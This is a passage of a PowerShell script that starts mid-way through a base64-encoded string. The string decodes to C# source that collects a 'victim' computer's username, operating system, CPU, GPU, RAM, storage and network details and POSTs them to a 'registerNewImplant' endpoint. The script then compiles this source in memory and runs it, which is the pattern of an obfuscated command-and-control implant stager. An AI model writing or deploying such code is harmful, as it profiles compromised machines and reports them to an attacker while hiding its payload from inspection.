N0cmluZyB1c2VybmFtZSA9IEdldEltcGxhbnRJbmZvLlVzZXJuYW1lKCk7DQogICAgICAgICAgICBzdHJpbmcgb3BlcmF0aW5nU3lzdGVtID0gR2V0SW1wbGFudEluZm8uT3BlcmF0aW5nU3lzdGVtKCk7DQogICAgICAgICAgICBpbnQgcmFtID0gR2V0SW1wbGFudEluZm8uUkFNKCk7IC8vIEFzc3VtaW5nIFJBTSgpIHJldHVybnMgc29tZXRoaW5nIGxpa2UgIjE2IEdCIg0KICAgICAgICAgICAgc3RyaW5nIGNwdSA9IEdldEltcGxhbnRJbmZvLkNQVSgpOw0KICAgICAgICAgICAgc3RyaW5nIGdwdSA9IEdldEltcGxhbnRJbmZvLkdQVSgpOw0KICAgICAgICAgICAgc3RyaW5nIHN0b3JhZ2UgPSBHZXRJbXBsYW50SW5mby5TdG9yYWdlKCk7DQogICAgICAgICAgICBzdHJpbmcgbmV0d29yayA9IEdldEltcGxhbnRJbmZvLk5ldHdvcmsoKS5SZXBsYWNlKCJcbiIsICJcXG4iKS5SZXBsYWNlKCJcciIsICJcXHIiKS5SZXBsYWNlKCJcIiIsICJcXFwiIik7DQogICAgICAgICAgICBzdHJpbmcgY3VycmVudERhdGUgPSBHZXRJbXBsYW50SW5mby5HZXRDdXJyZW50RGF0ZSgpOw0KICAgICAgICAgICAgaW50IG9wZXJhdG9ySWQgPSAxOw0KDQogICAgICAgICAgICB2aWN0aW0uSUQgPSBpZDsNCiAgICAgICAgICAgIHZpY3RpbS5Vc2VybmFtZSA9IHVzZXJuYW1lOw0KICAgICAgICAgICAgdmljdGltLkRldmljZU5hbWUgPSBkZXZpY2VOYW1lOw0KICAgICAgICAgICAgdmljdGltLk9wZXJhdGluZ1N5c3RlbSA9IG9wZXJhdGluZ1N5c3RlbTsNCiAgICAgICAgICAgIHZpY3RpbS5DUFUgPSBjcHU7DQogICAgICAgICAgICB2aWN0aW0uR1BVID0gZ3B1Ow0KICAgICAgICAgICAgdmljdGltLlN0b3JhZ2UgPSBzdG9yYWdlOw0KICAgICAgICAgICAgdmljdGltLk5ldHdvcmsgPSBuZXR3b3JrOw0KICAgICAgICAgICAgdmljdGltLkN1cnJlbnREYXRlID0gY3VycmVudERhdGU7DQogICAgICAgICAgICB2aWN0aW0uUkFNID0gcmFtOw0KICAgICAgICAgICAgdmljdGltLk9wZXJhdG9ySUQgPSBvcGVyYXRvcklkOw0KDQogICAgICAgICAgICByZXR1cm4gdmljdGltOw0KICAgICAgICB9DQoNCg0KICAgICAgICBwdWJsaWMgc3RhdGljIGFzeW5jIFRhc2sgUmVnaXN0ZXJJbXBsYW50KHN0cmluZyB2aWN0aW1fanNvbikNCiAgICAgICAgew0KICAgICAgICAgICAgdXNpbmcgKHZhciB3ZWJDbGllbnQgPSBuZXcgV2ViQ2xpZW50KCkpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgd2ViQ2xpZW50LkhlYWRlcnNbSHR0cFJlcXVlc3RIZWFkZXIuQ29udGVudFR5cGVdID0gImFwcGxpY2F0aW9uL2pzb24iOw0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYXdhaXQgd2ViQ2xpZW50LlVwbG9hZFN0cmluZ1Rhc2tBc3luYyhuZXcgVXJpKCJodHRwOi8vMTI3LjAuMC4xOjgwODEvcmVnaXN0ZXJOZXdJbXBsYW50IiksICJQT1NUIiwgdmljdGltX2pzb24pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBjYXRjaCAoV2ViRXhjZXB0aW9uIGV4KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgLy8gSGFuZGxlIHRoZSBleGNlcHRpb24gYWNjb3JkaW5nIHRvIHlvdXIgbmVlZHMNCiAgICAgICAgICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIkVycm9yOiAiICsgZXguTWVzc2FnZSk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KfQ0K'
    $bytes = [Convert]::FromBase64String($encodedSource)
    $source = [System.Text.Encoding]::UTF8.GetString($bytes)
    $provider = New-Object Microsoft.CSharp.CSharpCodeProvider
    $compiler = $provider.CreateCompiler()
    $parameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $parameters.GenerateInMemory = $True

    $parameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.dll") | Out-Null
    $parameters.ReferencedAssemblies.Add("System.Net.Http.dll") | Out-Null
    
    Write-Host $source
    $results = $compiler.CompileAssemblyFromSource($parameters, $source)
    if ($results.Errors.Count -eq 0) {
        $assembly = $results.CompiledAssembly
        $method = $assembly.EntryPoint
        $method.Invoke($null, $null)
    } else {
        $results.Errors | % { Write-Host $_.ErrorText }
    }
}

Invoke-Run
